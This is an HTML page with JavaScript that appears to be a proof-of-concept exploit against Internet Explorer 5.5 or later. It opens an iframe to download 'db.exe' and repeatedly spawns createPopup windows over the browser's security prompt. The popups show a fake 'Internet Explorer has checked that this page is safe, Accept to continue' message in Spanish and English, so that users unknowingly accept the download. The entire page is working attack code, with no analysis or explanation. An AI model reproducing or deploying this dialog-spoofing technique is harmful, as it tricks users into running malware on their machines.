<html>
<script type="text/javascript">

    function vuln_begin() {
      if (!window.createPopup) {
        alert('To visualize this it paginates IE it is required 5.5 or superior / Para visualizar esta pagina se requiere IE 5.5 o superior');
        return;
      }

        window.focus();
        window.resizeTo (window.screen.width, window.screen.height);
        document.write('<iframe src="db.exe">\x3C/iframe>');
        window.setTimeout(vuln_open, 1000);
    }


    var vuln_win, vuln_run;
    var vuln_x, vuln_y;

    function vuln_open() {
      var dims= vuln_measure(window);
      vuln_x= (dims.x+dims.w/2)+vuln_dims.x;
      vuln_y= (dims.y+dims.h/2)+vuln_dims.y;
      vuln_run= true;
      vuln_pop();
    }

    function vuln_pop() {
      if (!vuln_run) return;
      vuln_win= window.createPopup();
      vuln_win.document.body.innerHTML= vuln_html;
      vuln_win.document.body.onunload= vuln_pop;
      vuln_win.show(vuln_x, vuln_y, vuln_dims.w, vuln_dims.h);
      vuln_win.document.all.opensec.click();
    }

//    function vuln_close() {
//      vuln_run= false;
//      vuln_win.hide();
//    }

    function vuln_measure(win) {
      var root= win.document[
        (win.document.compatMode=='CSS1Compat') ?
        'documentElement' : 'body'
      ];
      var dims= new Array();
      dims.x= win.screenLeft;
      dims.y= win.screenTop;
      dims.w= root.offsetWidth;
      dims.h= root.offsetHeight;
      win.moveTo(dims.x, dims.y);
      win.resizeTo(dims.w, dims.h);
      dims.x= 2*dims.x-win.screenLeft;
      dims.y= 2*dims.y-win.screenTop;
      dims.w= 2*dims.w-root.offsetWidth;
      dims.h= 2*dims.h-root.offsetHeight;
      win.resizeTo(dims.w, dims.h);
      win.moveTo(dims.x, dims.y);
      return dims;
    }

    var vuln_dims= new Array();
    vuln_dims.x= -150;
    vuln_dims.y= -85;
    vuln_dims.w= 350;
    vuln_dims.h= 100;
    vuln_dims.y2= 1;
    vuln_dims.w2= 275;
    vuln_dims.h2= 29;

    var vuln_sec=
      'var w= window.createPopup();'+
      'w.document.body.style.background= \'ThreeDFace\';'+
      'var p= window.parent;'+
      'w.show(p.vuln_x+p.vuln_dims.w-p.vuln_dims.w2,'+
      '       p.vuln_y+p.vuln_dims.h+p.vuln_dims.y2,'+
      '       p.vuln_dims.w2,'+
      '       p.vuln_dims.h2);';

    var vuln_html=
      '\x3Cdiv style="'+
      '  height: 100%;'+
      '  background-color: ThreeDFace;'+
      '  font-family: \'MS Shell Dlg\', sans-serif;'+
      '  font-size: 8pt;'+
      '">'+
      '  \x3Cp style="padding-top: 4px;">'+
      '    Intenet Explorer ha comprobado que esta p�gina es segura'+
      '    Acepte para continuar'+
      '  \x3C/p>'+
      '  \x3Cp>'+
      ' Intenet Explorer has checked that this page is safe' +
      ' Accept to continue' +
      '  \x3C/p>'+
      '  \x3Cdiv id="opensec" onclick="'+vuln_sec+'">\x3C/div>'+
      '\x3C/div>';

  </script>
  <div>
    <input type="text" id="focusmonitor" style="position: absolute; left: -200px;" />
  </div>
  <script type="text/javascript"> vuln_begin(); </script>
</html>